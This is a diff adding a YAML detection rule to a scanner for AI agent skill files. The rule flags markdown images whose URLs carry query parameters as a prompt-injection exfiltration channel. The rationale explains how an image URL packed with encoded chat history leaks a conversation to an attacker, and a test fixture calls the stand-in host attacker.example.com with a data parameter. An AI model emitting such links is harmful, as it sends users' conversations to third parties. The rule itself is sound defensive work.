@@ -1,0 +1,45 @@
+id: PI-MDIMG-001
+slug: markdown-image-exfil
+title: "Markdown-image syntax with query-string parameters (data exfiltration vector)"
+severity: high
+category: prompt-injection
+owasp_ref: LLM06
+owasp_ast: AST06
+pattern:
+  type: regex
+  value: '!\[[^\]]*\]\(https?://[^)]+\?[^)]*=[^)]*\)'
+rationale: |
+  Habler / Antebi / Narajala "New Skills, New Threats" — a markdown image
+  rendered with URL-encoded chat history exfiltrates the conversation to
+  the attacker. Anthropic mitigated the runtime case with click-through
+  rendering, but the source-side hygiene is still ours: an authoring
+  pipeline should never embed an external image URL with query parameters
+  carrying agent state.
+references:
+  - https://embracethered.com/blog/posts/2023/data-exfiltration-anthropic-claude/
+  - https://owasp.org/www-project-agentic-skills-top-10/
+fixtures:
+  positive:
+    - "![pixel](https://attacker.example.com/?data=X)"
+  negative:
+    - "![logo](https://example.com/logo.png)"
+scope:
+  file_patterns:
+    - "**/SKILL.md"
+    - "skills/**/*.md"
+    - "**/references/*.md"
+    - "**/references/**/*.md"
+    - "**/assets/**/*.md"
+  ignore_in_fenced_blocks: true
+context_rules:
+  skip_if_path_matches:
+    - "wrapper/tests/**"
+    - "**/__snapshots__/**"
+    - "**/README.md"
+    - "**/CHANGELOG.md"
+    - "docs/threat-model.md"
+fix:
+  auto: false
+  description: "Remove query parameters from referenced image URLs, or host the image alongside the skill."
+status: stable
+since: "0.1.0"
